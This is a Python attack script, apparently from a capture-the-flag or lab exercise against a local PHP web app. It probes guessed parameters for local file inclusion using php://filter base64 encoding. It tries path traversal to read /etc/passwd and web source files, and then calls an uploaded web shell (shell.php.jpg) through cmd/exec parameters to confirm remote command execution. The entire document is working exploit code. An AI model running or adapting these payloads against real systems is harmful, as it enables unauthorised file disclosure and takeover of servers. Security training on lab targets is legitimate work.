import requests
import base64
import re

base_url = "http://127.0.0.1:32824"

print("Attempting to read index.php source code via LFI...")
print("=" * 60)

# Try php://filter to read index.php source
payload = "php://filter/convert.base64-encode/resource=index.php"
param_names = ['file', 'include', 'page', 'inc', 'path', 'img', 'view']

for param in param_names:
    url = f"{base_url}/index.php?{param}={payload}"
    resp = requests.get(url)
    print(f"\nTesting {param}=php://filter...")
    print(f"Status: {resp.status_code}")
    print(f"Response length: {len(resp.content)}")
    
    if resp.status_code == 200 and len(resp.content) > 1000:
        # Try to find base64 encoded content
        content = resp.text
        # Look for base64 patterns
        b64_pattern = r'([A-Za-z0-9+/]{100,}={0,2})'
        matches = re.findall(b64_pattern, content)
        
        if matches:
            print(f"[FOUND] Base64 content via {param} parameter")
            # Try to decode the largest match
            largest = max(matches, key=len)
            try:
                decoded = base64.b64decode(largest).decode('utf-8', errors='ignore')
                print(f"\nDecoded source code:\n{'='*60}")
                print(decoded)
                print(f"{'='*60}")
                break
            except Exception as e:
                print(f"Decode error: {e}")
        else:
            print(f"Content snippet: {content[:500]}")

# If we can't get index.php, try to get other common files
print("\n\nTrying to read other configuration files...")
test_files = ['/etc/passwd', '/etc/hosts', '/var/www/html/index.php']

for param in param_names:
    for test_file in test_files:
        url = f"{base_url}/index.php?{param}=../../..{test_file}"
        resp = requests.get(url)
        if resp.status_code == 200 and 'root:' in resp.text:
            print(f"[LFI SUCCESS] {param}=../../..{test_file}")
            print(f"Content: {resp.text[:1000]}")
        elif resp.status_code == 200 and len(resp.text) > 500 and 'Invalid Image' not in resp.text:
            print(f"[INTERESTING] {param}=../../..{test_file} - {len(resp.text)} bytes")
            print(f"Content: {resp.text[:500]}")

print("\n\nTesting direct access to uploaded PHP shell...")
print("=" * 60)

# Direct access to uploaded shell - if directory is not executable, this won't work
shell_url = f"{base_url}/upload/shell.php.jpg"
resp = requests.get(shell_url)
print(f"Direct access to shell: {resp.status_code}")
if resp.status_code == 200:
    print(f"Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
    print(f"First 500 chars: {resp.text[:500]}")

# Try with parameter
for param in ['cmd', 'command', 'exec', 'run']:
    shell_cmd_url = f"{shell_url}?{param}=id"
    resp = requests.get(shell_cmd_url)
    if resp.status_code == 200 and 'uid=' in resp.text:
        print(f"[RCE] Shell execution via {param} parameter!")
        print(f"Output: {resp.text}")
